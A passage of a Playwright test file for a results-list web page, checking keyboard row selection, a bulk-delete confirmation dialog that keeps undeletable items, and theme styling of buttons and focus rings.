  await page.keyboard.press("j");
  await page.keyboard.press("x");
  assert.equal(await picked(), "5 selected");
  assert.ok(await box("Extra 16").isChecked(), "j moves on from the row whose box was clicked");
  await page.keyboard.press("Escape");
  assert.equal(await bar.count(), 0);

  // A change to what matches clears the selection, so nothing chosen is out of sight.
  await box("Extra 20").click();
  await page.getByLabel("Search results").fill("extra");
  assert.equal(await bar.count(), 0);
  assert.equal(await box("Extra 20").isChecked(), false);
});

test("a bulk delete lists what goes, keeps what the store refuses, says so, and refreshes the list", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { archiveRoot, runsRoot, url } = await fixture(t, 0, false, { busy: true });
  const page = await newPage(t);
  const titles = page.locator("table.results .title");
  await page.goto(url);
  await titles.first().waitFor();
  for (const title of ["Busy question", "Question pages-copy", "Question pages"]) await page.getByRole("checkbox", { name: `Select ${title}`, exact: true }).check();
  await page.getByRole("group", { name: "Selection" }).getByRole("button", { name: "Delete…" }).click();

  const dialog = page.getByRole("dialog", { name: "Delete 3 results?" });
  await dialog.waitFor();
  assert.equal(await page.evaluate(() => document.activeElement?.textContent), "Cancel", "Cancel is focused");
  await dialog.getByText(/can't be undone/).waitFor();
  await dialog.getByText("1 result can't be deleted and will be kept.").waitFor();
  const items = dialog.locator("li");
  assert.equal(await items.count(), 3);
  assert.match(await items.nth(0).textContent() ?? "", /Busy question\s*This run still has agents at work/);
  assert.match(await items.nth(1).textContent() ?? "", /Question pages-copy\s*1 archived run · 1 run record/);
  // Cancel removes nothing.
  await dialog.getByRole("button", { name: "Cancel" }).click();
  assert.ok(existsSync(join(archiveRoot, "pages")));

  await page.getByRole("group", { name: "Selection" }).getByRole("button", { name: "Delete…" }).click();
  await dialog.getByRole("button", { name: "Delete 2 of 3 results" }).click();
  const result = page.getByRole("dialog", { name: "Deleted 2 of 3" });
  await result.waitFor();
  assert.match(await result.locator("li").textContent() ?? "", /Busy question/);
  assert.equal(await page.evaluate(() => document.activeElement?.textContent), "Close");
  await result.getByRole("button", { name: "Close" }).click();

  assert.deepEqual(await titles.allTextContents(), ["Busy question"], "the list is read again");
  assert.equal(await page.getByRole("group", { name: "Selection" }).locator(".picked").textContent(), "1 selected", "what was kept stays chosen");
  await page.getByText("Deleted 2 results").waitFor();
  assert.ok(!existsSync(join(archiveRoot, "pages")) && !existsSync(join(archiveRoot, "pages-copy")) && !existsSync(join(runsRoot, "ab-00000001")));
  assert.ok(existsSync(join(archiveRoot, "busy")) && existsSync(join(runsRoot, "ab-40000000")));
});

test("the page's primary action is ink-filled like a chosen segment, focus rings are neutral and only for the keyboard, and no control is orange", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t);
  for (const colorScheme of ["light", "dark"] as const) {
    const page = await newPage(t, { colorScheme });
    await page.goto(url);
    await page.locator("table.results .title", { hasText: "Question pages-copy" }).click();
    const report = page.getByRole("link", { name: "Open report" });
    await report.waitFor();
    const style = (element: Element) => {
      const css = getComputedStyle(element);
      return { background: css.backgroundColor, color: css.color, radius: css.borderTopLeftRadius };
    };
    const primary = await report.evaluate(style);
    const chosen = await page.locator(".segmented button[aria-pressed=true]").first().evaluate(style);
    const ink = await page.evaluate(() => {
      const probe = document.body.appendChild(document.createElement("i"));
      probe.style.color = "var(--ink)";
      const color = getComputedStyle(probe).color;
      probe.remove();
      return color;
    });
    assert.equal(primary.background, ink, colorScheme);
    assert.equal(primary.background, chosen.background, colorScheme);
    assert.equal(primary.color, chosen.color, colorScheme);
    assert.equal(primary.radius, "6px");

    // No orange fill on any control, and the old accent is gone.
    // Orange is a hue of 12 to 45 degrees, well saturated; danger's red sits below it.
    const orange = await page.evaluate(() => [...document.querySelectorAll("button, a, input")].filter((element) => {
      const [r, g, b, a = 1] = getComputedStyle(element).backgroundColor.match(/[\d.]+/g)!.map(Number);
      const max = Math.max(r!, g!, b!);
      const min = Math.min(r!, g!, b!);
      if (a === 0 || max - min < 60 || max !== r) return false;
      const hue = (60 * (g! - b!)) / (max - min);
      return hue >= 12 && hue <= 45;
    }).length);
    assert.equal(orange, 0, colorScheme);
    assert.equal(await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue("--accent")), "");

    // A click shows no ring; the keyboard does, in a neutral tone.
    await page.goto(url);
    const search = page.getByLabel("Search results");
    await search.click();
    assert.equal(await search.evaluate((input) => getComputedStyle(input).outlineStyle), "none");
    await page.keyboard.press("Tab");
    const ring = await page.evaluate(() => {
      const css = getComputedStyle(document.activeElement!);
      return { style: css.outlineStyle, width: css.outlineWidth, color: css.outlineColor };
    });
    const muted = await page.evaluate(() => {
      const probe = document.body.appendChild(document.createElement("i"));
      probe.style.color = "var(--muted)";
      const color = getComputedStyle(probe).color;
      probe.remove();
      return color;
    });
    assert.deepEqual(ring, { style: "solid", width: "2px", color: muted }, colorScheme);
  }
});
